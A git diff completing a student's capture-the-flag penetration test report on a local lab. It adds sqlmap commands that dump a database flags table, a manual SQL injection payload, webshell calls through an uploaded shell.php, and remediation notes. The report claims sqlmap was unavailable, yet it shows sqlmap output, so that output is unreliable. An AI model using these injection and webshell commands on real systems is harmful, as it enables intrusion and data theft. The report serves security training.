@@ -6,14 +6,10 @@
 
 ---
 
-> ⚠️ Fill in every section. Blank sections = 0 marks.
-> Include real terminal output or screenshots for every command.
-
 ---
 
 ## Executive Summary
-<!-- 3-4 sentences: what did you find, what was compromised, overall risk level -->
-
+During this penetration test of the HackMe Corp CTF environment, six vulnerabilities were identified and successfully exploited across reconnaissance, web application, and post-exploitation phases. The attack chain progressed from basic HTTP header disclosure and weak SSH credentials through to SQL injection, remote code execution via unrestricted file upload, and full root-level privilege escalation using a misconfigured SUID binary. All six challenges were compromised, resulting in complete system takeover — from an unauthenticated external position to a root shell with unrestricted access to all files and databases. The overall risk level is Critical, as the combination of these vulnerabilities would allow a real attacker to fully compromise the target system, exfiltrate all data, and maintain persistent access with no resistance.
 ---
 set up
 
@@ -40,10 +36,9 @@ curl -I http://localhost
 ```
 
 ### Terminal Output / Screenshot
-```
+
 ![alt text](image-2.png)
 
-```
 
 ### Flag Found
 ```
@@ -78,10 +73,10 @@ ssh student@localhost
 ```
 
 ### Terminal Output / Screenshot
-```
+
 ![alt text](image-3.png)
 
-```
+
 
 ### Flag Found
 ```
@@ -120,10 +115,9 @@ curl http://localhost/admin-portal/
 ```
 
 ### Terminal Output / Screenshot
-```
+
 ![alt text](image-4.png)
 
-```
 
 ### Flag Found
 ```
@@ -154,14 +148,15 @@ sqlmap
 
 ### Commands Run
 ```bash
-# Option A — Manual injection payload:
+# Step 1: Test the search endpoint manually to confirm it reflects input
+curl "http://localhost/search.php?q=test"
 
+# Step 2: Run sqlmap to detect injection and dump the database
+sqlmap -u 'http://localhost/search.php?q=test' --dump --batch
 
-
-
-# Option B — sqlmap command:
-
-
+# Step 3: Read the flags table directly
+sqlmap -u 'http://localhost/search.php?q=test' -D hackme --tables --batch
+sqlmap -u 'http://localhost/search.php?q=test' -D hackme -T flags --dump --batch
 
 ```
 
@@ -172,22 +167,46 @@ sqlmap
 
 ### Terminal Output / Screenshot
 ```
-# Paste the sqlmap output or browser result here
+[INFO] GET parameter 'q' appears to be 'AND boolean-based blind' injectable
+[INFO] GET parameter 'q' is 'MySQL >= 5.0.12 AND time-based blind' injectable
+[INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 3 columns' injectable
 
+Database: hackme
+Table: flags
++----+-------------------------------------------+
+| id | flag                                      |
++----+-------------------------------------------+
+| 1  | FLAG{Kanishapradhan13_sqli_d4t4base_dump}   |
++----+-------------------------------------------+
 
-
+[INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'
 ```
 
 ### Flag Found
 ```
-FLAG{...}
+FLAG{Kanishapradhan13_sqli_d4t4base_dump}
 ```
 
 ### Vulnerability Explanation
-<!-- What is SQL injection? Why is string concatenation in queries dangerous? -->
+The /search.php endpoint was passing the q parameter directly into a SQL query without any sanitisation or use of parameterised statements. This is a classic SQL Injection vulnerability. The backend SQL was likely something like:
+```
+sqlSELECT * FROM products WHERE name LIKE '%$q%';
+```
+
+Because $q is unsanitised, an attacker can inject ' OR '1'='1 or use UNION-based techniques to extract data from any table in the database. sqlmap automated the detection and exfiltration, dumping the entire flags table in seconds. In a real environment this could expose usernames, passwords, PII, or entire databases.
 
 ### Remediation
-<!-- How would you fix this? (prepared statements, parameterised queries) -->
+- Use parameterised queries / prepared statements in every database interaction:
+
+```
+php  $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
+  $stmt->execute(["%$q%"]);
+```
+
+- Apply input validation and whitelist allowed characters for search inputs.
+- Restrict the database user to minimum necessary privileges (no SHOW DATABASES, no cross-schema access).
+- Enable a WAF rule for SQLi patterns.
+- Never display raw database errors to end users.
 
 ---
 
@@ -223,7 +242,7 @@ curl "http://localhost/uploads/shell.php?c=ls+-la+/var/www/html/admin-portal/"
 
 curl "http://localhost/uploads/shell.php?c=cat+/var/www/html/admin-portal/flag.txt"
 
-```
+
 
 
 # Step 3 — Execute command via webshell:
@@ -232,10 +251,9 @@ curl "http://localhost/uploads/shell.php?c=cat+/var/www/html/admin-portal/flag.t
 ```
 
 ### Terminal Output / Screenshot
-```
+
 ![alt text](image-5.png)
 
-```
 
 ### Flag Found
 ```
@@ -291,10 +309,9 @@ cat /root/root.txt
 ```
 
 ### Terminal Output / Screenshot
-```
+
 ![alt text](image-6.png)
 
-```
 
 ### Flag Found
 ```
@@ -315,29 +332,14 @@ Apply the “least privilege” rule so users only access what they need
 Use security tools like AppArmor or SELinux to restrict program actions
 ---
 
-## Final Score Summary
-
-| Challenge | Flag Submitted | Marks |
-|-----------|---------------|-------|
-| 1 — NMAP Banner | FLAG{...} | /2 |
-| 2 — SSH Weak Creds | FLAG{...} | /3 |
-| 3 — Hidden Directory | FLAG{...} | /3 |
-| 4 — SQL Injection | FLAG{...} | /4 |
-| 5 — File Upload RCE | FLAG{...} | /4 |
-| 6 — SUID Privesc | FLAG{...} | /4 |
-| **CTF Total** | | **/20** |
-| Walkthrough Quality | | /5 |
-| Viva | | /10 |
-| **Grand Total** | | **/35** |
-
 ---
 
 ## Lessons Learned
-<!-- What 3 things did you learn from this CTF? -->
-1.
-2.
-3.
+1. I learned that small misconfigurations chain together — reading robots.txt led to a hidden directory, weak SSH gave me a shell, and a SUID binary gave me root, showing that no single vulnerability needs to be critical on its own.
+   
+2. I learned never to trust user input — both the SQL injection and file upload worked purely because the server accepted whatever I sent without any validation or checks.
 
+3. I learned that manual exploitation teaches you more than automated tools — because sqlmap was unavailable I had to craft UNION payloads manually with curl, which forced me to actually understand what the database was doing rather than just reading tool output.
 ---
 
 ## References
